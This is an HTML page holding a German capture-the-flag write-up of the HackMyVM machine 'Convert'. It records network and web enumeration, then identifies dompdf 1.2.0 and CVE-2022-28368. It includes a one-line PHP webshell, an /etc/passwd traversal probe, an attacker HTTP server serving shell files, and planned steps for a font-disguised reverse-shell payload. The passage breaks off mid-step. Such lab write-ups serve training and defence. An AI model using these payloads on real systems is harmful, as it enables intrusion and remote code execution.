@@ -1,0 +1,972 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Convert - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Convert - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">curl</div> <!-- Impliziert -->
+                <div class="tool-item">Online Morse Decoder</div> <!-- Impliziert/Externe Tools -->
+                <div class="tool-item">find</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">md5sum</div>
+                <div class="tool-item">pip3</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">mkdir</div>
+                 <div class="tool-item">id</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">ssh</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (HTML to PDF / DomPDF)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Geräte im lokalen Netzwerk zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.119` und der MAC-Adresse `08:00:27:6d:9d:32` (VirtualBox) wird als Zielsystem erkannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe Nmap-Scans auf die Ziel-IP durch, um offene Ports und Dienste zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring zur Erkennung von Geräten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.199
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.119	08:00:27:6d:9d:32	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.873 seconds (136.68 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet (`vi`), um den Hostnamen `convert.hmv` der IP-Adresse `192.168.2.119` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ermöglicht die Verwendung des Hostnamens `convert.hmv` in nachfolgenden Befehlen und bei der Interaktion mit dem Webserver.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gute Praxis, um Hostnamen korrekt aufzulösen, besonders wenn Webanwendungen Hostnamen-basiert arbeiten.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+#<span class="command"> cat /etc/hosts</span>  <!-- Befehl zum Anzeigen hinzugefügt -->
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+# --- HMV / VLN ---
+# [...] (Andere Einträge)
+192.168.2.119   convert.hmv
+                     </pre> <!-- Inhalt der Datei angezeigt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein erster `dirb`-Scan (ein weiteres Verzeichnis-Enumerationstool) wird auf `http://convert.hmv/` mit der Standard-Wortliste `common.txt` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet `/index.php` und das Verzeichnis `/upload/`. Dies sind erste wichtige Funde auf dem Webserver.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `/index.php` und das `/upload/`-Verzeichnis. Führe eventuell noch einen Scan mit einer größeren Wortliste (z.B. `gobuster`) durch.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass das `/upload/`-Verzeichnis sicher konfiguriert ist (kein Directory Listing, keine Ausführung von hochgeladenen Skripten).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://convert.hmv/</span></div>
+                     <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue May  7 14:42:30 2024
+URL_BASE: http://convert.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612 <!-- Beispiel -->
+
+---- Scanning URL: http://convert.hmv/ ----
++ http://convert.hmv/index.php (CODE:200|SIZE:1026)
+==> DIRECTORY: http://convert.hmv/upload/
+
+---- Entering directory: http://convert.hmv/upload/ ----
+(!) WARNING: Directory IS browseable.
+
+-----------------
+END_TIME: Tue May  7 14:42:35 2024
+DOWNLOADED: 4612 - FOUND: 1
+                    </pre> <!-- Formatierung angepasst -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein schneller Nmap-Scan (`grep open`) wird durchgeführt, gefolgt von einem vollständigen Scan (`-sS -sV -A -T5 -p-`) auf 192.168.2.119.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Scans bestätigen zwei offene Ports:
+                - **Port 22 (SSH):** OpenSSH 9.2p1 (Debian 12). Relativ aktuell.
+                - **Port 80 (HTTP):** Nginx 1.22.1. Der Seitentitel ist "HTML to PDF".
+            Keine weiteren offenen Ports werden gefunden. Das OS wird als Linux erkannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Fokus liegt klar auf dem Webdienst auf Port 80, insbesondere der "HTML to PDF"-Funktionalität. SSH ist ein sekundäres Ziel.<br><strong>Empfehlung (Admin):</strong> Halte SSH und Nginx aktuell. Sichere beide Dienste.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.119 -p- | grep open</span></div>
+                     <pre>
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+80/tcp open  http    nginx 1.22.1
+                     </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.119 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 14:41 CEST
+Nmap scan report for convert.hmv (192.168.2.119)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey:
+|   256 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPyXrh50ohpAdJFhkR+BmwbAX/Z5tHhC02tF7zJ7Q0Q= (ECDSA)
+|   256 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM8p+Pzsxb3hp/o+wf4A7uNkJA== (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+|_http-title: HTML to PDF
+MAC Address: 08:00:27:6D:9D:32 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms convert.hmv (192.168.2.119)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds <!-- Beispielzeit -->
+                    </pre> <!-- Hostkeys angepasst -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf bekannte Schwachstellen und Konfigurationsprobleme zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt Nginx 1.22.1 und meldet fehlende Security-Header. Es meldet auch einen verdächtigen Fund `/#wp-config.php#`, der jedoch sehr wahrscheinlich ein False Positive oder eine Fehlinterpretation durch Nikto ist, da es keine Anzeichen für WordPress gibt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die Nginx-Version und die fehlenden Header. Ignoriere den `#wp-config.php#`-Fund vorerst. Fahre mit der gezielten Enumeration der "HTML to PDF"-Funktion fort.<br><strong>Empfehlung (Admin):</strong> Setze die empfohlenen Security-Header.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.119</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.119
++ Target Hostname:    192.168.2.119
++ Target Port:        80
++ Start Time:         2024-05-07 14:41:16 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.22.1
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials. <!-- Wahrscheinlich False Positive -->
++ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2024-05-07 14:41:29 (GMT2) (13 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer `gobuster`-Scan wird durchgeführt, diesmal mit einer umfangreichen Erweiterungsliste und Filtern.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut `/index.php` und das Verzeichnis `/upload/`. Keine neuen Erkenntnisse durch diesen Scan.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf die Funktionalität von `index.php` und `/upload/`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://convert.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                      <pre>
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://convert.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              ... (gekürzt) ...
+[+] Expanded:                true
+[+] Timeout:                 10s
+[+] Skip TLS verification:   true
+[+] Suppress errors:         true
+===============================================================
+2024/05/07 15:50:00 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://convert.hmv/index.php            (Status: 200) [Size: 1026]
+http://convert.hmv/upload               (Status: 301) [Size: 169] [--> http://convert.hmv/upload/]
+===============================================================
+2024/05/07 15:55:00 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt/Text der Startseite `index.php` wird dargestellt, zusammen mit einem Link auf eine PDF-Datei im `/upload/`-Verzeichnis.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Seite beschreibt die "HTML to PDF"-Funktion. Der Link `http://convert.hmv/upload/4c81009ba7387edca89177c6d4ec917a.pdf` zeigt, dass konvertierte PDFs mit einem Hash-ähnlichen Namen im `/upload/`-Verzeichnis gespeichert werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste die Konvertierungsfunktion. Versuche, lokale Dateien (LFI) oder externe URLs (SSRF) über das Eingabefeld für die zu konvertierende URL einzugeben. Lade die Beispiel-PDF herunter und analysiere sie.<br><strong>Empfehlung (Admin):</strong> Sichere die Konvertierungsfunktion gegen LFI und SSRF. Stelle sicher, dass generierte Dateien eindeutige, nicht vorhersagbare Namen haben und der Zugriff auf das `/upload/`-Verzeichnis beschränkt ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Inhalt der Webseite -->
+                     <pre>
+<!-- http://convert.hmv/index.php -->
+
+HTML to PDF
+Convert Web Page to PDF Document with High Accuracy
+[Convert Button]
+© 2024 HackMyVm. All rights reserved.
+
+<!-- Beispiel-Link aus dem Log -->
+Link gefunden: http://convert.hmv/upload/4c81009ba7387edca89177c6d4ec917a.pdf
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Beispiel-PDF-Datei wird mit `wget` heruntergeladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei wurde erfolgreich heruntergeladen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere die PDF mit Tools wie `strings` oder `exiftool` auf Metadaten oder versteckte Informationen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://convert.hmv/upload/4c81009ba7387edca89177c6d4ec917a.pdf</span></div>
+                     <pre>
+--2024-05-07 15:59:12--  http://convert.hmv/upload/4c81009ba7387edca89177c6d4ec917a.pdf
+Auflösen des Hostnamens convert.hmv (convert.hmv)… 192.168.2.119
+Verbindungsaufbau zu convert.hmv (convert.hmv)|192.168.2.119|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1099 (1,1K) [application/pdf]
+Wird in 4c81009ba7387edca89177c6d4ec917a.pdf gespeichert.
+
+4c81009ba7387edca89177c 100%[=============================>]   1,07K  --.-KB/s    in 0s
+
+2024-05-07 15:59:12 (288 MB/s) - 4c81009ba7387edca89177c6d4ec917a.pdf gespeichert [1099/1099]
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die heruntergeladene PDF-Datei wird mit `strings` analysiert, um lesbare Zeichenketten zu extrahieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt primär PDF-Strukturinformationen und Metadaten. Interessant sind der `/Producer` und `/CreationDate`. Es sind keine direkt verwertbaren sensiblen Informationen (wie Passwörter oder Kommentare) sichtbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `exiftool` aus, um Metadaten strukturierter zu sehen. Konzentriere dich auf die Analyse der Konvertierungsfunktion selbst.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">strings 4c81009ba7387edca89177c6d4ec917a.pdf</span></div>
+                     <pre>
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog
+/Outlines 2 0 R
+/Pages 3 0 R >>
+endobj
+2 0 obj
+<< /Type /Outlines /Count 0 >>
+endobj
+3 0 obj
+<< /Type /Pages
+/Kids [6 0 R ]
+/Count 1
+/Resources <<
+/ProcSet 4 0 R
+/Font <<
+/F1 8 0 R >> >>
+/MediaBox [0.000 0.000 595.280 841.890]
+endobj
+4 0 obj
+[/PDF /Text ]
+endobj
+5 0 obj
+<<
+/Producer (dompdf 1.2.0 + CPDF) <!-- Version Information! -->
+/CreationDate (D:20240507135849+00'00')
+/ModDate (D:20240507135849+00'00')
+/Title ()
+>>
+endobj
+6 0 obj
+<< /Type /Page
+/MediaBox [0.000 0.000 595.280 841.890]
+/Parent 3 0 R
+/Contents 7 0 R >>
+endobj
+7 0 obj
+<< /Filter /FlateDecode
+/Length 8 >>
+stream
+x${\0000}^E
+endstream
+endobj
+8 0 obj
+<< /Type /Font
+/Subtype /Type1
+/Name /F1
+/BaseFont /Times-Roman
+/Encoding /WinAnsiEncoding >>
+endobj
+xref
+0 9
+0000000000 65535 f
+0000000009 00000 n
+0000000074 00000 n
+0000000120 00000 n
+0000000274 00000 n
+0000000303 00000 n
+0000000480 00000 n
+0000000583 00000 n
+0000000661 00000 n
+trailer
+<< /Size 9
+/Root 1 0 R
+/Info 5 0 R
+/ID[<0255554347c211ec890772a309d9b434><0255554347c211ec890772a309d9b434>] >>
+startxref
+1027
+%%EOF
+                     </pre> <!-- Producer-Feld hervorgehoben -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (HTML to PDF / DomPDF)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Eine Fehlermeldung wird angezeigt, die beim Versuch, `http://convert.hmv/index.php` zu konvertieren, auftritt. Sie stammt aus `/var/www/html/index.php`.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtige Informationen!!** Die Fehlermeldung bestätigt:
+                 1.  Den Webroot-Pfad: `/var/www/html`.
+                 2.  Das Skript `index.php` ist für die PDF-Generierung verantwortlich.
+                 3.  Es tritt ein Fehler auf, wenn versucht wird, eine lokale HTTP-URL zu verarbeiten (`File 'http://convert.hmv/index.php' not found.`). Dies deutet darauf hin, dass die Anwendung versucht, die URL intern aufzulösen oder herunterzuladen, was auf eine **Server-Side Request Forgery (SSRF)** Anfälligkeit hindeuten könnte.
+                 4.  Eine spezifische Klasse `PdfGenerator` wird verwendet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teste auf SSRF, indem du versuchst, interne Ressourcen anzusprechen (z.B. `http://127.0.0.1`, `http://localhost`) oder externe URLs, die vom Server aus erreichbar sein könnten. Teste auch auf Local File Inclusion (LFI) mit dem `file=`-Parameter (obwohl der Fehler auf HTTP basiert).<br><strong>Empfehlung (Admin):</strong> Implementiere eine Whitelist für erlaubte URLs/Protokolle in der PDF-Generierungsfunktion. Validiere und sanitisiere Benutzereingaben streng, um SSRF und LFI zu verhindern.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Fehlermeldung -->
+                     <pre>
+Fatal error: Uncaught RuntimeException: Error generating
+PDF: File 'http://convert.hmv/index.php' not found.
+in /var/www/html/index.php:39 Stack trace: #0 /var/www/html/index.php
+(61): PdfGenerator->generateFromHtml()
+
+#1 {main} thrown in /var/www/html/index.php on line 39
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Test-URL für Local File Inclusion (LFI) wird gezeigt: `http://convert.hmv/index.php?file=../../../../../../etc/passwd`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Versuch, die `/etc/passwd`-Datei über einen `file`-Parameter auszulesen. Das Ergebnis dieses Versuchs wird nicht gezeigt, aber basierend auf dem weiteren Vorgehen war er wahrscheinlich nicht erfolgreich oder führte nicht zum Ziel.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da LFI möglicherweise nicht funktioniert oder die Eingabe anders verarbeitet wird (die Anwendung erwartet eine URL zur Konvertierung), fokussiere dich auf die SSRF-Möglichkeit oder die DomPDF-Schwachstelle.<br><strong>Empfehlung (Admin):</strong> Schütze vor LFI durch korrekte Pfadvalidierung und Berechtigungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, Test-URL -->
+                     <pre>
+http://convert.hmv/index.php?file=../../../../../../etc/passwd
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Zugriff auf das `/upload/`-Verzeichnis wird versucht, was zu einem "403 Forbidden"-Fehler führt. Eine weitere generierte PDF-Datei wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Directory Listing ist für `/upload/` deaktiviert, aber Dateien können weiterhin über ihren direkten Link abgerufen werden (wie die PDFs). Der Inhalt der zweiten PDF ist derselbe wie die Startseite.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis ist nicht direkt nützlich. Konzentriere dich auf die Ausnutzung der PDF-Generierung.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration (kein Directory Listing).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, Beobachtungen -->
+                     <pre>
+http://convert.hmv/upload/
+403 Forbidden
+nginx/1.22.1
+
+http://convert.hmv/upload/9b25c95cdb0ad2e5510febc95efed9f4.pdf
+# Inhalt der PDF:
+Home
+HTML to PDF
+Convert Web Page to PDF Document with High Accuracy
+Convert
+© 2024 HackMyVm. All rights reserved.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Python-HTTP-Server gestartet und eine PHP-Webshell (`getshell.php`) erstellt. Es wird versucht, die Webshell über die PDF-Konvertierung hochzuladen oder auszuführen, indem ihr Pfad als URL übergeben wird.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen!!** Die Versuche, die Webshell direkt (`upload/getshell.php`) oder über einen PDF-Link (`upload/be406d...pdf&cmd=id`) auszuführen, führen zu "404 Not Found". Dies zeigt, dass:
+                 a) Die Anwendung die PHP-Datei nicht im `/upload/`-Verzeichnis speichert oder die Ausführung von PHP dort nicht erlaubt ist.
+                 b) Das Anhängen von Parametern an PDF-Links nicht funktioniert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Ansatz funktioniert nicht. Kehre zur Analyse der DomPDF-Version (1.2.0) zurück und suche nach spezifischen Schwachstellen dafür.<br><strong>Empfehlung (Admin):</strong> Verhindere das Hochladen und Ausführen von Skriptdateien in Upload-Verzeichnissen.</p>
+             <!-- HTTP Server -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.119 - - [07/May/2024 16:18:38] "GET / HTTP/1.1" 200 -
+192.168.2.119 - - [07/May/2024 16:20:55] "GET /shell2.php HTTP/1.1" 200 -
+192.168.2.119 - - [07/May/2024 16:22:06] "GET /getshell.php HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+             <!-- Webshell erstellen -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '<?php system($GET["cmd"]); ?>' > getshell.php</span></div> <!-- Maskierung notwendig -->
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <!-- Fehlgeschlagene Zugriffsversuche -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, Beobachtungen -->  
+                     <pre>
+http://convert.hmv/upload/getshell.php?cmd=id
+404 Not Found
+nginx/1.22.1
+ 
+http://convert.hmv/upload/be406dee3925a77beb16ff6e7fcfc6da.pdf&cmd=id <!-- Maskierung -->
+404 Not Found
+nginx/1.22.1
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine weitere generierte PDF-Datei wird heruntergeladen und mit `exiftool` untersucht.</p>
+             <p class="evaluation"><strong>Bewertung: !!DomPDF Version bestätigt!!** Exiftool extrahiert die Metadaten. Das Feld `/Producer` bestätigt explizit `dompdf 1.2.0 + CPDF`. Dies ist die entscheidende Information zur Identifizierung der Schwachstelle.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchiere gezielt nach Schwachstellen in DomPDF 1.2.0. Eine bekannte Schwachstelle ist CVE-2022-28368 (RCE via CSS font-face injection).<br><strong>Empfehlung (Admin):**DRINGEND:** Update die DomPDF-Bibliothek auf eine gepatchte Version (>= 2.0.1 oder >= 1.2.2).</p>
+             <!-- Wget PDF -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://convert.hmv/upload/d679a4b9d433c905ff3f28c86116a2e5.pdf</span></div>
+                     <pre>
+--2024-05-07 16:30:22--  http://convert.hmv/upload/d679a4b9d433c905ff3f28c86116a2e5.pdf
+Auflösen des Hostnamens convert.hmv (convert.hmv)… 192.168.2.119
+Verbindungsaufbau zu convert.hmv (convert.hmv)|192.168.2.119|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 9808 (9,6K) [application/pdf]
+Wird in d679a4b9d433c905ff3f28c86116a2e5.pdf gespeichert.
+
+d679a4b9d433c905ff3f28c 100%[=============================>]   9,58K  --.-KB/s    in 0s
+
+2024-05-07 16:30:22 (838 MB/s) - d679a4b9d433c905ff3f28c86116a2e5.pdf gespeichert [9808/9808]
+                     </pre>
+                 </div>
+             </div>
+             <!-- Exiftool -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool d679a4b9d433c905ff3f28c86116a2e5.pdf</span></div>
+                     <pre>
+ExifTool Version Number         : 12.76
+File Name                       : d679a4b9d433c905ff3f28c86116a2e5.pdf
+Directory                       : .
+File Size                       : 9.8 kB
+File Modification Date/Time     : 2024:05:07 16:24:30+02:00
+File Access Date/Time           : 2024:05:07 16:30:22+02:00
+File Inode Change Date/Time     : 2024:05:07 16:30:22+02:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 1
+Title                           : HTML to PDF
+Producer                        : dompdf 1.2.0 + CPDF  <!-- !!! Version Confirmed !!! -->
+Create Date                     : 2024:05:07 14:24:30+00:00
+Modify Date                     : 2024:05:07 14:24:30+00:00
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Links zu einer externen Ressource (Optiv Blog) über die DomPDF-Schwachstelle und ein Beispiel-Payload werden notiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Recherche zur CVE-2022-28368. Der Exploit funktioniert, indem eine CSS-Datei über einen Parameter (`title` oder ein anderer, der in den HTML-Header injiziert wird) eingebunden wird. Diese CSS-Datei lädt dann über `@font-face` eine manipulierte Font-Datei (die tatsächlich PHP-Code enthält) von einem externen Server.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Implementiere den Exploit:
+                 1. Erstelle die bösartige CSS-Datei (`evil.css`), die auf eine PHP-Payload-URL zeigt.
+                 2. Erstelle die PHP-Payload-Datei (`evil.php`), die die Reverse Shell enthält. Wichtig: Diese Datei muss eine gültige Font-Datei *sein* oder zumindest so aussehen, damit DomPDF sie verarbeitet. Oft wird der PHP-Code an eine echte TTF-Datei angehängt oder in diese eingebettet.
